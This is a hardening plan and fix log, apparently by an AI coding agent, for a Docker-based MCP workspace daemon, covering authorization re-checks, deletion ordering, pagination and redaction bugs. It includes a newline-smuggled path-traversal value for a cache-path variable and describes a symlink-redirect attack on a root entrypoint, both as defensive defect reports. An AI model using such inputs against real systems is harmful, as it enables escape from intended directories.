- [x] Either reload `RepositoryRegistry` on config change, or restate HR-016's
      "immediately revokes access" / "live configuration" as restart-scoped

**Defect (reproduced).** `tools/execution.py:510`, `:518`, `:626` take only
`job_id` and never touch the registry, while `exec` (`:328`) and `exec_start`
(`:434`) both call `get_authorized`. After deauthorization, a client holding a
stale `job_id` still reads that job's captured stdout/stderr and can cancel it.
`job_store.get(job_id)` already returns `workspace_id`, so the check is one line.

`RepositoryRegistry` is constructed once at `server.py:55` and never reloaded, so
"live" means "as of last restart". The test file says so honestly; the checkbox
and HR-016 do not.

Reproduced directly first: opened a workspace, started a job via `exec_start`,
removed the repository from configuration (a fresh `create_server` over the
same `state_db_path`, this suite's own established "simulated restart"
pattern), then called `exec_status` with the still-live `job_id` — it
returned the job's live state instead of `REPOSITORY_NOT_ALLOWED`, exactly as
predicted.

**Implementation.** A new `_reauthorized_job(job_id)` helper resolves
`job_store.get(job_id) → record.workspace_id`, then calls `get_authorized`
(the same one-line re-check `exec`/`exec_start` already perform) before
returning the record; `exec_status_tool`/`exec_output_tool`/`exec_cancel_tool`
all route their existing `job_store.get(job_id)` calls through it instead
(`exec_cancel_tool`'s *second* `job_store.get` — re-reading state immediately
after its own cancellation, not a fresh client-facing request — is
deliberately left as a plain lookup, not re-authorized a second time).
`DockerWorkspaceManager.get` is a side-effect-free DB read, but `manager` the
*instance* only exists when `docker_client is not None` — `_reauthorized_job`
fails closed with `ContainerRuntimeFailedError` when it's `None`, matching
`exec`/`exec_start`'s own degraded-mode behavior, rather than a raw
`AttributeError` on `None.get(...)` or silently skipping the check.

HR-016 (`docs/HARDENING_SPEC.md`) restated rather than implementing live
config reload — RR-011 offered both as valid — to name what the code actually
does: deauthorization takes effect on the daemon's *next restart*, not
against an already-running process. Also folded in RR-010's own scope
correction (job-scoped tools are covered by the same property, not only
`workspace_id`-scoped ones).

**A real bug in my own first implementation, caught before it shipped.**
The first draft defined `_reauthorized_job` *between* `exec_status_tool`'s
`@server.tool(...)`/`@translate_workspace_errors` decorators and the
`async def exec_status_tool` line they were meant to wrap — Python decorators
apply to whatever function immediately follows them, so both decorators
silently wrapped `_reauthorized_job` instead, registering *it* (a plain sync
function) as the `"exec_status"` tool, while the real `exec_status_tool`
became dead, unregistered code. Every test using two independent
`create_server` calls against the same `state_db_path` failed with
`sqlite3.ProgrammingError: SQLite objects created in a thread can only be
used in that same thread` — the MCP framework offloads a *sync*-detected
tool to a worker thread (`anyio.to_thread.run_sync`), and that worker thread
differs from the one that opened the event-loop-thread-affine `sqlite3.Connection`
used to seed the job/workspace rows. Diagnosed by directly inspecting the
registered `Tool` object (`server._tool_manager._tools["exec_status"].fn`),
which was `_reauthorized_job`, not `exec_status_tool` — confirming the
decorator misplacement rather than a genuine threading issue in the
framework or in `sqlite3` itself. Fixed by moving `_reauthorized_job`'s
definition above the decorated block.

**Verified the tests catch the regression.** Reverted `tools/execution.py` to
`HEAD`, reran the 4 new defect-reproduction tests: all failed with `DID NOT
RAISE ToolError`, exactly the pre-fix behavior the reproduction predicted (a
5th, "still-configured repository is unaffected" test correctly passed
unchanged, since that behavior isn't what this task's fix touches). Restored;
all 27 tests across the two files pass again.

**Full relevant suite.** `tests/workspace/ tests/jobs/`: 367 passed. Full
unscoped suite: 918 passed. No Docker leftovers.

**New tests.** `tests/workspace/test_authorization_recheck.py`:
`test_rr010_exec_status_fails_after_repository_removed`,
`test_rr010_exec_output_fails_after_repository_removed`,
`test_rr011_exec_cancel_fails_after_repository_removed` (all three following
this file's own established two-server "simulated restart" pattern), and
`test_rr010_job_scoped_tools_still_work_for_a_still_configured_repository`
(the re-check SHALL NOT be overzealous). `tests/workspace/
test_execution_tools.py`: `test_rr010_exec_status_fails_clearly_when_docker_unreachable`,
seeding a job row's `repository`/`workspace` foreign-key parents directly via
SQL (`tests/jobs/conftest.py`'s own established pattern) since `exec_start`
itself requires Docker and so can't be used to create one in a degraded-mode
test.

### R9 — `delete` cannot wedge a workspace ✅
**Satisfies:** RR-012 · **Verified by:** RAT-012
**Commit:** `a6c378c`

- [x] Move cache-volume removal and ssh-agent termination so they cannot sit
      between container removal and row deletion
- [x] Make both best-effort (log and continue) — neither is a reason to strand
      the row
- [x] Test a `delete` whose volume removal fails

**Defect (reproduced structurally).** `workspace/manager.py:653-661` orders:
mark `DELETING` → remove container → **remove cache volumes** (raises) →
**terminate ssh-agent** (raises) → delete rows. `_remove_cache_volumes` raises
`ContainerRuntimeFailedError` on any `DockerException`, including
`409 volume is in use` — reachable because cache volumes are *repository*-scoped
and shared with every other workspace of that repository. Either failure leaves
container gone and row in `DELETING`, **permanently**: a retry finds no container
and hits the same failure.

H23 introduced the volume-removal failure point into the method H16 had just made
atomic — the second clause of HR-018 was never implemented.

Upgraded from "reproduced structurally" to reproduced end to end against a
real Docker daemon before implementing anything: created a workspace with a
cache-mounted volume, held that volume in use with a second real container
(the exact cross-workspace sharing HR-009 exists to support), and called
`delete` — it raised `ContainerRuntimeFailedError` (a real `409 volume is in
use`), the container was confirmed genuinely gone, the row was confirmed
stuck at `state='deleting'`, and a retry hit the identical failure. Exactly
as predicted.

**Implementation.** Cache-volume removal and ssh-agent termination both moved
to *after* the `job`+`workspace` row-deletion transaction — the container and
the rows are what make a workspace "deleted"; neither cleanup step is, so
neither can any longer sit between them. On top of that reordering, both are
now also best-effort: `_remove_cache_volumes` catches `DockerException` and
logs a warning instead of raising, and a new `_terminate_ssh_agent` wrapper
catches any exception from `SSHAgentManager.terminate` (deliberately broader
than that method's own internal handling, which its own docstring scopes to
just the termination *signal*) and logs rather than propagating. Two
independent guarantees rather than one: even if a future change moved either
step back to its old position, it still couldn't raise; even if a future
change made either step raise-capable again, it's no longer positioned where
that would matter.

**Verified the tests catch the regression.** Reverted `workspace/manager.py`
to `HEAD`, reran the 2 new tests: the volume-removal one failed with the
exact real `ContainerRuntimeFailedError`/409 the reproduction produced; the
ssh-agent one failed with the injected `RuntimeError` propagating uncaught
out of `delete`. Restored; all 24 tests in the file pass again. No Docker
leftovers (containers or cache volumes) after either run.

**Full relevant suite.** `tests/workspace/`: 334 passed. Full unscoped suite:
920 passed. No Docker leftovers.

**New tests.** `tests/workspace/test_manager.py`:
`test_rr012_delete_succeeds_and_leaves_no_row_when_volume_removal_fails`
(the real, end-to-end 409-in-use reproduction — asserts `delete` no longer
raises, the container and row are both genuinely gone, and the volume itself
correctly still exists since the failure was real, just no longer fatal to
the call) and `test_rr012_delete_succeeds_when_ssh_agent_termination_fails`
(a deterministic forced failure via a `SSHAgentManager` subclass, since
provoking a genuine ssh-agent-termination failure isn't practically
reproducible the way the volume one is).

### R10 — A failed termination is never reported as success ✅
**Satisfies:** RR-013, RR-015 · **Verified by:** RAT-013
**Commit:** `fe7ca34`

- [x] Propagate the `DockerException` at `execution/service.py:205-208` instead
      of returning silently
- [x] Bound the drain by closing the stream, not by abandoning the `wait_for` —
      including on the `timeout_seconds is None` path
- [x] Test with `exec_inspect` raising, not with `os.killpg` monkeypatched

**Defect (reproduced structurally).** `execution/service.py:205-208`:

```python
try:
    info = self._docker.api.exec_inspect(exec_id)
except docker.errors.DockerException:
    return                                   # <- silent success
```

The docstring three lines above states "HR-020 requires a failed signal be
reported as a structured error, not silently swallowed". `_terminate` sees no
exception, `termination_failed` stays `False`, and `_run` marks the job
`CANCELED`/`TIMED_OUT`. This is also the last untranslated `DockerException` in
the exec path H19 subtask 1 claims to have closed.

Separately: `asyncio.wait_for` cancels the awaiting future, not the `to_thread`
worker. A stream that never EOFs holds an executor thread forever; the only thing
that frees it (`live.stream.close()`) runs *only on termination failure*. The
reviewing agent's own verification script hung on this until killed.

Upgraded from "reproduced structurally" to reproduced end to end against a
real Docker daemon: started a job, force-removed its *container* out from
under the still-running exec (so a subsequent `exec_inspect` genuinely 404s
— not a mock), then called `exec_cancel`. On the pre-fix code this returned
`{"state": "canceled"}` — a clean, silent success — even though the process
inside the now-gone container was never actually signaled at all.

**Implementation.** `kill`'s `try/except docker.errors.DockerException:
return` around `exec_inspect` is gone — the exception now propagates.
`_terminate` (`async_runner.py`) widened its own `except OSError` to also
catch `docker.errors.DockerException`, wrapping either into the same
structured `ContainerRuntimeFailedError` it already produced for a
`PermissionError`. For the drain-bounding half: `_terminate_and_track_failure`
now force-closes `live.stream` in a `finally`, unconditionally — not only
inside the `except ContainerRuntimeFailedError` branch, which is what the
code did before. A *successful* `_terminate` only confirms the kill signal
was delivered; it says nothing about whether the underlying Docker exec
stream will actually reach EOF promptly afterward (a daemon/network quirk
can still leave it blocked), and `asyncio.wait_for` elsewhere cancels only
the *awaiting* future, never the underlying `asyncio.to_thread` worker still
blocked on that same read — closing the stream is the only thing that
reliably frees it. Because `_terminate_and_track_failure` is the single
shared call site for both `_run`'s own internal timeout handling *and*
`cancel_job`, this one change covers the `timeout_seconds is None` path too
(`cancel_job` is the only way a `None`-timeout job's termination is ever
attempted at all — `_run` itself never bounds that branch).

**Verified the tests catch the regression.** Reverted `execution/service.py`
and `execution/async_runner.py` to `HEAD`, reran the new test: failed with
the exact real `docker.errors.NotFound` (404, "No such exec instance")
surfacing all the way up through `drain_stream`'s own `exec_inspect` call
(a related, separately-real crash site — logged via H31's existing
`_logger.exception` catch-all rather than silently swallowed there either)
instead of the expected `CONTAINER_RUNTIME_FAILED` from `exec_cancel`
itself. Restored; all 31 tests across both files pass again.

**Full relevant suite.** `tests/workspace/`: 335 passed. Full unscoped
suite: 921 passed. No Docker leftovers.

**New tests.** `tests/workspace/test_async_execution_tools.py`:
`test_rr013_failed_termination_via_a_real_exec_inspect_failure` — the same
assertions as the existing `os.killpg`-monkeypatched sibling test
(structured error, job not marked `canceled`, a bounded reach of a terminal
state rather than a hang), but forcing the failure at the *other* point in
`kill` (`exec_inspect` itself, via a genuinely removed container) the
checklist specifically asked for real, not monkeypatched, coverage of.

### R11 — `rebuild`/`reset` never adopt the container they replace ✅
**Satisfies:** RR-014
**Commit:** `970c483`

- [x] Disable adoption on the `_recreate` path
- [x] Start an adopted container before returning it as ready, or return a state
      the caller must act on
- [x] Test `reset` against a row whose `container_id` is `None` while a labeled
      container still holds the deterministic name

**Defect.** `_recreate` resolves the container to remove by `container_id`, so
when the row's `container_id` is `None` but a labeled container occupies the
name — H15's own scenario #2 — `_run_container` → `_adopt_or_remove_by_name`
adopts it. `reset` promises to discard environment state; `rebuild(image=…)`
promises the new image. Both silently return the stale container.

Adoption also propagates a non-running state straight out of `ensure_workspace`
with no `start()`, so the first `workspace_open` after adopting a stopped orphan
returns `STOPPED` and the next tool call raises `WORKSPACE_NOT_RUNNING`. It
self-heals on the second call; the first is wrong. The adopt test uses a
*running* container.

Reproduced both defects directly against a real Docker daemon before
implementing anything: `reset` against a row with `container_id` cleared but
a still-running labeled container at the name returned the *same*
container_id, and the old container was confirmed still present afterward.
Separately, adopting a genuinely *stopped* orphan (via the fresh-`_create`
path, not `reconcile()`'s own distinct adoption logic, which already starts
correctly — `ensure_workspace` with the row deleted, not merely
`container_id`-cleared) returned `state: stopped` on the very first call. A
first attempt at this second reproduction accidentally exercised the
already-correct `reconcile()` path and showed no bug; re-derived the actual
reachable path from `ensure_workspace`'s own code before writing the real
test — confirmed cleanly reproduced only once the row was deleted outright.

**Implementation.** `_adopt_or_remove_by_name` and `_run_container` both
gained `allow_adopt: bool` (default `True`, unchanged for `_create`/
`ensure_workspace`'s own HR-017 recovery branch — both are legitimate
crash-recovery adoption, not this defect's concern). `_recreate`
(`rebuild`/`reset`) now calls `_run_container(..., allow_adopt=False)` — any
container occupying the deterministic name, labeled or not, is routed into
the existing removal branch instead, guaranteeing a genuinely new container
every time. Separately, `_run_container` now checks the adopted record's
state: if it isn't already `RUNNING`, it calls `self.start(...)` before
returning, rather than propagating whatever state Docker happened to report.

**Verified the tests catch the regression.** Reverted `workspace/manager.py`
to `HEAD` (confirmed genuinely reverted via `grep -c allow_adopt` returning
`0`, after an initial revert attempt silently no-op'd), reran the 2 new
tests: the reset one failed with the identical container_id surviving; the
adoption one failed with `state == stopped` instead of `running` — both
exactly the reproduced defects. Restored; all 26 tests in the file pass
again. No Docker leftovers.

**Full relevant suite.** `tests/workspace/`: 337 passed. Full unscoped
suite: 923 passed. No Docker leftovers.

**New tests.** `tests/workspace/test_manager.py`:
`test_rr014_reset_never_adopts_the_container_it_replaces` (the exact H15
scenario #2, using a running orphan — `reset` must produce a different
container_id, the new container must be `RUNNING`, and the old container_id
must no longer exist) and `test_rr014_ensure_workspace_starts_a_stopped_adopted_container`
(a genuinely stopped orphan adopted via the fresh-create path — the same
container_id is correctly adopted, but its state must be `RUNNING`, not
`STOPPED`, on the very first call).

---

## Phase 3 — High: output and pagination

### R12 — Pagination is character-safe under any content ✅
**Satisfies:** RR-016, RR-017 · **Verified by:** RAT-014, RAT-015
**Commit:** `219d57f`

- [x] Trim by scanning back for a UTF-8 lead byte, or re-attempt the decode past
      each invalid byte — not by inspecting only the first `UnicodeDecodeError`
- [x] Reject `max_bytes < 1`
- [x] Clamp `next_offset` to `total_bytes` rather than echoing an out-of-range offset
- [x] Test with invalid bytes present, for every `max_bytes` from 1 to 64

**Defect (both reproduced).** `_trim_incomplete_trailing_char` inspects only the
first decode error, so an earlier invalid byte masks the truncated tail:

```
window  = b'\xff\xe6\x97'      # 0xff, then 2 of the 3 bytes of 日
trimmed = b'\xff\xe6\x97'      # unchanged -> the character is split
```

Invalid bytes are a *designed-for* input: H19 added
`encode("utf-8", errors="surrogateescape")` at `git/diff.py:145` specifically so
they survive. The test uses valid UTF-8 only.

And `max_bytes=0` is accepted, producing permanent zero progress:

```
call1  next_offset=0  truncated=True
call2  next_offset=0  truncated=True     <- forever
```

— precisely the case H24's write-up claims was eliminated.

All three reproduced directly against the real function/a real repository
before implementing anything: `_trim_incomplete_trailing_char(b'\xff\xe6\x97')`
returned unchanged; `read_git_diff(repo, max_bytes=0)` looped `next_offset=0`
forever across two real calls; `read_git_diff(repo, max_bytes=100,
offset=99999)` on a diff with `total_bytes=118` echoed `next_offset=99999`
back unclamped.

**Implementation.** `_trim_incomplete_trailing_char` rewritten to scan
backward from the end of the window (at most 4 bytes — UTF-8's own maximum
sequence length) for the trailing character's own lead byte, via a new
`_utf8_lead_sequence_length` helper that classifies a byte as ASCII/2-byte/
3-byte/4-byte lead or "not a valid lead at all." This is independent of
whatever precedes it — an earlier invalid byte no longer masks a genuinely
truncated character later in the same window. `max_bytes < 0` became
`max_bytes < 1`, rejecting `0` outright. `next_offset = offset + len(window)`
became `next_offset = min(offset + len(window), total_bytes)` — an
already-past-the-end `offset` now reports `next_offset == total_bytes`
("you're at the end") instead of echoing the out-of-range value back
unclamped.

**Verified the tests catch the regression.** Reverted `git/diff.py` to
`HEAD`, reran the 6 new tests: the byte-level trim test, the `max_bytes=0`
rejection test, and the `next_offset`-clamping test all failed for the exact
reproduced reasons; the other 3 (complete-character, lone-invalid-byte, and
bare-continuation-bytes trim cases) passed unchanged — correct, since those
describe behavior the fix doesn't touch. The "every `max_bytes` from 1 to
64, invalid byte present" pagination test also passed unchanged on the
reverted code — an honest regression-guard, not a defect-catcher: the
existing "keep the untrimmed window" fallback already guaranteed forward
progress and termination even with the masking bug, silently corrupting
content rather than hanging, which is exactly why the byte-level unit test
above (not a black-box pagination loop) is what actually catches this
specific defect. Restored; all 26 tests in the file pass again.

**Full relevant suite.** `tests/git/ tests/workspace/test_git_diff_log_tools.py`:
193 passed (fast — host-side, minimal Docker). Full unscoped suite:
930 passed. No Docker leftovers.

**New tests.** `tests/git/test_diff.py`: four pure-function tests for
`_trim_incomplete_trailing_char` (the invalid-byte-masking reproduction, a
complete trailing character left untouched, a lone invalid trailing byte
left untouched, a run of bare continuation bytes with no reachable lead byte
left untouched), `max_bytes=0` rejection, `next_offset` clamping for an
out-of-range offset, and the checklist's own "every `max_bytes` from 1 to
64" pagination test against a diff containing a genuine invalid byte.

### R13 — `read_file` classifies and bounds correctly ✅
**Satisfies:** RR-018, RR-020 · **Verified by:** RAT-016
**Commit:** `9daa910`

- [x] Decode on a character boundary — a mid-character cut is truncated text, not binary
- [x] Set `truncated=True` whenever the read was bounded
- [x] `seek`/`read` the requested span for `byte_range` instead of an unbounded `f.read()`
- [x] Test with a multi-byte character at the limit boundary

**Defect (reproduced — regression).** `filesystem/service.py:202,221` reads
`limit + 1` bytes then `data.decode("utf-8")`:

```
max_read_bytes=10, file = b"a"*10 + "é".encode() + b"tail"
->  is_binary=True   content=None   truncated=False
```

An ordinary UTF-8 text file is reported as binary, content dropped, and
`truncated=False` denies the client even the signal to retry. Pre-H29 read the
whole file and truncated with `errors="ignore"`. The write-up discloses only the
opposite narrowing.

`byte_range` remains an unbounded read: `read_file(path, byte_range=(0,1))` on a
10 GB in-repo file loads 10 GB. The H29 rationale ("needs the full content
decoded to slice at an arbitrary position") is wrong for `byte_range` — the slice
is applied to raw bytes, so `seek`/`read` is exactly equivalent. Only
`line_range` genuinely needs scanning.

Both reproduced directly against the real function before implementing
anything: the exact `max_read_bytes=10` example above returned
`is_binary=True, content=None, truncated=False`; a 200 MiB file's peak RSS
grew by 600 MiB (not the requested 5 bytes) serving `byte_range=(0, 5)`.

**Implementation.** The character-boundary trim R12 added for `git_diff`'s
own pagination (`_trim_incomplete_trailing_char`) is exactly the fix
`read_file` needs too — extracted into a new shared module,
`utf8_boundary.py` (`trim_incomplete_trailing_char` +
`utf8_lead_sequence_length`, both now public), rather than reimplemented a
second time: the same defect class (a byte window blind to character
boundaries) risked two copies silently diverging. `git/diff.py` now imports
from it under its original private name — a behavior-preserving refactor,
confirmed by rerunning all 26 of R12's own tests unchanged before touching
`read_file` at all.

`read_file` restructured into three explicit branches (`line_range`,
`byte_range`, the common bounded case), replacing the old two-way split that
conflated the "peek 1 extra byte" no-range path with the "read everything"
ranged path:

- **Common case (no range):** the `limit + 1`-byte peek read is unchanged,
  but the *content* buffer is now `data[:limit]` — the peek byte is never
  part of what gets decoded — and, only when the read was actually bounded
  (`truncated`), trimmed to a clean character boundary via the shared
  helper before decoding. An *untruncated* buffer is left untrimmed
  deliberately: that's the genuine end of the file, and a real dangling
  partial sequence there means the file itself isn't valid UTF-8, which
  trimming must not hide. `truncated` is now computed *before* the
  is-it-binary decode and reported on both the `is_binary=True` and
  `is_binary=False` return paths — the old code hardcoded `False` on the
  binary path unconditionally.
- **`byte_range`:** `seek`/`read` the requested span directly, never
  `f.read()`ing the whole file. `sha256`/`size` still need every byte of
  the whole file (§13.2) regardless of the requested span — streamed via
  the same chunked pass the common case already uses, which also resolves
  `end=None` ("to the end of the file") without a second read. A split
  character at the client's own chosen `start`/`end` is still tolerated via
  `errors="replace"`, matching the prior behavior — unlike the common
  case's `limit` boundary (this daemon's own choice, worth trimming
  cleanly), an arbitrary client-chosen offset has no "next call" to defer a
  split character to.
- **`line_range`:** unchanged in substance — genuinely needs the whole
  content decoded to slice at an arbitrary line boundary, which byte
  offsets alone can't locate.

**Verified the tests catch the regression.** Reverted `filesystem/service.py`
to `HEAD` (the shared `utf8_boundary.py` module and `git/diff.py`'s use of it
stayed in place, already independently verified against R12's own suite),
reran the 5 new tests: the exact reproduction, the mid-character-at-the-limit
variant, and the binary-file-truncated-True test all failed with
`is_binary`/`truncated` exactly as reproduced; the memory test failed with
peak RSS growing by **600 MiB** serving a 5-byte range from a 200 MiB file —
real, measured proof the old code loaded the whole file. The
genuinely-invalid-trailing-byte-at-true-EOF test passed unchanged, correctly
— that's the converse case the fix must *not* alter. Restored; all 62 tests
in the file pass again, including one existing test (`test_at_h029_a_byte_
range_deep_in_a_large_file_still_works`) whose own docstring had gone stale
describing the pre-fix "deliberately reads everything" behavior — corrected
to describe what the code does now.

**Full relevant suite.** `tests/git/test_diff.py tests/filesystem/
tests/tools/test_filesystem.py`: 153 passed. Full unscoped suite:
935 passed. No Docker leftovers.

**New tests.** `tests/filesystem/test_service.py`: the exact `max_read_bytes=10`
reproduction, a `max_read_bytes=11` variant where the *limit itself* (not just
the peek byte) lands mid-character, a genuinely-binary-file-truncated-True
test, a genuinely-incomplete-trailing-byte-at-true-EOF test (the fix's
converse case), and a peak-RSS measurement proving `byte_range` on a 200 MiB
file stays within 50 MiB of baseline. `utf8_boundary.py`'s own logic is
covered by both call sites' existing test suites (R12's 4 pure-function
cases, still exercising the same shared implementation post-extraction, plus
`read_file`'s own new tests here) rather than a third, duplicate direct test
file.

### R14 — `read_log_tail` returns whole lines ✅
**Satisfies:** RR-019 · **Verified by:** RAT-017
**Commit:** `PLACEHOLDER`

- [x] Change `>=` to `>` at `execution/log_capture.py:159`
- [x] Test `read_log_tail` composed with `tail_text` — the composition
      `exec_status` actually uses — at a **nonzero** backward offset

**Defect (reproduced).** `count()` includes the newline terminating the leading
partial line, so at `count == max_lines` only `max_lines - 1` complete lines
follow and `tail_text`'s `lines[-max_lines:]` returns the fragment first. At
production defaults, 2 of 60 line widths return a truncated fragment presented as
a complete log line — on **every poll** of a running job.

Existing coverage cannot catch it: one test writes a 10 KB file so `read_from == 0`
and the backward arithmetic never runs; the other is the vacuous assertion R22
removes.

Reproduced directly by precisely constructing the exact boundary condition
(not by chance): 200 uniform 328-byte lines positioned so the first
64 KiB (`_TAIL_INITIAL_CHUNK_BYTES`) backward chunk contains exactly
`max_lines=200` newlines — `read_log_tail` + `tail_text`, composed exactly
as `exec_status` uses them, returned a garbled 327-`x` fragment as the
*first* of the 200 "lines" instead of a genuine complete line.

**Implementation.** One-character fix: `data.count(b"\n") >= max_lines` →
`> max_lines`. The leading fragment's own terminating newline is one of the
newlines `count()` sees but is not one of the `max_lines` *complete* lines
that must follow the fragment — `>=` counted it as if it were one of them.
`>` requires the fragment's own newline *plus* a genuine one for each of
the `max_lines` complete lines, so the loop correctly keeps doubling
`chunk_size` (bounded by the existing `read_from == 0` fallback, so this
can't loop forever) until that actually holds.

**Verified the tests catch the regression.** Reverted
`execution/log_capture.py` to `HEAD`, reran the new test: failed with the
first of 200 returned "lines" being the garbled 327-`x` fragment, not a
complete line — the exact reproduced defect. Restored; all 23 tests in the
file pass again.

**Full relevant suite.** `tests/execution/ tests/workspace/
test_async_execution_tools.py tests/workspace/test_execution_tools.py`: 68
passed. Full unscoped suite: 936 passed. No Docker leftovers.

**New tests.** `tests/execution/test_log_capture.py`:
`test_rr019_read_log_tail_composed_with_tail_text_at_a_nonzero_backward_offset`
— the checklist's own ask, composing `read_log_tail` with `tail_text` (not
`read_log_tail`'s raw bytes alone, which is not what a client ever actually
sees) via a construction precisely engineered to hit the exact `count ==
max_lines` boundary at the *first* backward chunk, with the file large
enough (~5x the initial chunk) that the fix's second, doubled read
converges at a genuinely nonzero `read_from` rather than by luck falling
back to reading the whole file (which a self-check assertion in the test
would itself have caught, since that would mean the construction didn't
actually exercise the intended boundary).

---

## Phase 4 — State reporting (regressions introduced by H32–H35)

### R15 — `oom_killed` reflects the current container
**Satisfies:** RR-021 · **Verified by:** RAT-018

- [ ] Recompute or clear `oom_killed` on every transition that changes which
      container the record describes — `start`, `stop`, `restart`, `_recreate`
- [ ] Test the OOM → successful-reopen path, not only OOM → reconcile

**Defect (reproduced against real Docker).** Only `reconcile` and the
Docker-failure paths set it; the lifecycle transitions preserve whatever was
there:

```
AFTER OOM:               state=failed   oom_killed=True
AFTER SUCCESSFUL REOPEN: state=running  oom_killed=True    <- stale
```

A healthy running workspace reports `oom_killed: true` indefinitely, contradicting
the field's own docstring and `docs/SPEC.md` §26. Both H32 tests covered only the
single OOM→reconcile transition.

### R16 — A running job has a pid, or its absence is surfaced
**Satisfies:** RR-022

- [ ] Retry `pid_of` until the exec reports one, or record the absence explicitly
- [ ] Make `reconcile_jobs` distinguish "pid unknown" from "pid not alive"
- [ ] Correct `mark_running`'s docstring, which promises a later update that does
      not exist
- [ ] Decide `update_output_counts`: wire it up or delete it with its test

**Defect.** `ExecutionService.pid_of` returns `int | None` — `None` on
`DockerException` and on a missing/zero `Pid`. `mark_running(pid=None)` is
therefore reachable, and its docstring promises the value is filled in "by a
later update". `mark_running` is the **only** writer of `pid` in the codebase;
`update_output_counts` does not touch `pid` and has zero production call sites.
So a job that starts without a pid never gets one, and `reconcile_jobs` reports
`pid_alive=False` — withholding the orphaned-process warning that exists for
exactly this case.

The review's two separate findings ("the no-race claim is false" and
"`update_output_counts` is dead code") are the same defect: the dead method is
the missing half of the mitigation.

### R17 — Transport classification separates auth from local failure
**Satisfies:** RR-023 · **Verified by:** RAT-019

- [ ] Anchor `is_auth_failure` on wording that genuinely indicates a rejected
      credential — OpenSSH's parenthetical (`Permission denied (publickey)`), or
      SSH context — not the bare substring
- [ ] Test a local `Permission denied` is *not* classified as auth failure

**Defect (reproduced — introduced by H32).**

```
error: cannot open '.git/FETCH_HEAD': Permission denied        -> GIT_AUTH_FAILED
fatal: could not create leading directories: Permission denied -> GIT_AUTH_FAILED
warning: unable to unlink .git/x: Permission denied            -> GIT_AUTH_FAILED
```

`GitAuthFailedError` carries `default_recoverable = False`, so a fixable local
permission problem is reported as a permanent credential failure. Reachable
through the supported `git_dir_mode: read-only` (§18.2), under which the
container cannot write `.git` and every `git_pull` fetch produces this class of
error.

The precedent was already in the codebase and was cited as the model:
`git/pull.py`'s `is_non_fast_forward_failure` docstring explicitly warns against
misclassifying a command's *other* failure modes.

---

## Phase 5 — Redaction, entrypoint, environment

### R18 — Redaction recurses and preserves types
**Satisfies:** RR-009 · **Verified by:** RAT-010

- [ ] Carry the key hint into the dict branch (`errors.py:284`), as the list
      branch at `:290` already does
- [ ] Do not redact a non-string scalar solely on a substring key hint, or
      preserve its type when redacting

**Defect (reproduced).** H11 fixed the list branch and left the dict branch one
line above it unfixed:

```
{'secret': {'a': 'hunter2'}}  ->  {'secret': {'a': 'hunter2'}}   <- LEAKS
{'ssh_key_present': True}     ->  {'ssh_key_present': '[REDACTED]'}
{'key_count': 3}              ->  {'key_count': '[REDACTED]'}
```

The first is a real leak of the exact shape H11 was written to stop. The other
two silently convert booleans and integers to strings in `details` and audit
`metadata` — latent today, but the first `*_key_*` count or flag anyone adds will
be mangled.

### R19 — The entrypoint rejects malformed cache entries and does not follow symlinks
**Satisfies:** RR-029, RR-030

- [ ] Reject any entry containing a newline (`IFS=':' read -ra` consumes only the
      first line and silently drops the rest)
- [ ] Treat leading, middle, and trailing empty fields identically
- [ ] Do not `mkdir -p`/`chown` through a symlink as root — resolve under `$HOME`
      or operate per-component with `-h`
- [ ] Correct `entrypoint.sh:90-98`'s comment, which contradicts H6's validator

**Defect (verified in bash).** `MCP_CACHE_PATHS=$'.cargo\n../../etc'` silently
drops `../../etc` — no rejection, no mount — while the write-up claims the script
"exits non-zero rather than silently skipping the bad entry". A trailing colon is
likewise dropped, while leading/middle empties are correctly rejected.

`entrypoint.sh:119-120` follows symlinks as root before the identity drop. Cache
volumes persist across runs and are container-writable, so a symlink planted in
one cache's volume redirects a later, `..`-free cache path outside `$HOME`.

### R20 — Every daemon-controlled variable is merged last
**Satisfies:** RR-031

- [ ] Compute `MCP_CACHE_PATHS` inside `build_workspace_run_kwargs` and merge it
      with the other `MCP_*` variables, not through `extra_env`

**Defect.** `MCP_CACHE_PATHS` is daemon-computed but injected through
`extra_env` (`tools/workspace.py:416-418`, `cli.py:265-267`), which
`build_workspace_run_kwargs` merges **first** (`container_config.py:103,108`).
The dict-overwrite is additionally guarded by `if resolved_caches:`. H6's stated
property — "ordering alone cannot produce an override even if the filter is
bypassed" — does not hold for it. Not exploitable today only because H6's filter
and H8's re-validation both stand; that is defense-in-depth working, not the
property being met.

---

## Phase 6 — Test and build integrity

### R21 — Teardown removes only what the suite created
**Satisfies:** RR-024 · **Verified by:** RAT-020

- [ ] Track volume *creation*, not reference (`conftest.py:78-80`)
- [ ] Until then, give each run a unique repository id so the deterministic
      volume name cannot collide with production
- [ ] Test that a volume matching the production name for a repository the suite
      also uses survives a full run

**Defect.** `conftest.py:78-80` records every volume-type mount `Source` from
`run()` kwargs — every volume *referenced*, not created — and teardown
`remove(force=True)`s them. Every test hard-codes repository id `"example"` and
`cache_volume_name` is deterministic, so a real deployment on the same host
serving repository `example` with a `cargo` cache **loses that volume and its
contents to a suite run**. H1's write-up claims "every removal targets an
identity this process itself watched get created."

This is H1's own still-open concurrency item, but the destructive half is
reachable without concurrency.

### R22 — Replace assertions that restate their subject's postcondition
**Satisfies:** RR-025

- [ ] `tests/execution/test_log_capture.py:205-218` — assert the returned bytes
      are the correct last N lines, not `count(b"\n") >= N`
- [ ] `tests/git/test_service.py:227-238` — assert the read *succeeded* and
      returned correct content, not merely that a marker is absent

**Defect (reproduced).** The log-capture test's sole assertion is literally the
loop's exit condition at `log_capture.py:159`; it cannot fail while the loop
terminates. The `diff.external` test passes even though
`git -c diff.external= diff` exits 128 with `fatal: external diff died` — a read
that fails is indistinguishable from a read that was safely neutralized, which
H3's own subtask forbids.

This is HR-027's anti-pattern recurring two tasks after the task that fixed it,
which is why RR-025 is a standing requirement rather than a one-time correction.

### R23 — Coverage is selected adversarially
**Satisfies:** RR-026

Strengthen each test to exercise the input class that motivated its requirement.
Most are folded into R3–R17; this task is the sweep that confirms none was missed:

- [ ] Character-safe pagination — invalid bytes present (R12)
- [ ] Index rollback — a path with prior staged content (R4)
- [ ] Pathspec literalization — `""`, `"."`, `"./"` (R3)
- [ ] Failed termination — unreachable Docker daemon (R10)
- [ ] Enumeration resilience — symlink loop, permission error (R6)
- [ ] Tail correctness — nonzero backward offset (R14)
- [ ] Text/binary — multi-byte character at the limit boundary (R13)

### R24 — Reverting a fix fails a test
**Satisfies:** RR-027

Each is implemented but unconstrained — deleting the fix leaves the suite green:

- [ ] `--end-of-options` placement (`git/diff.py:125`, `git/log.py:96`) — every
      existing test uses a leading-`-` value, which trips
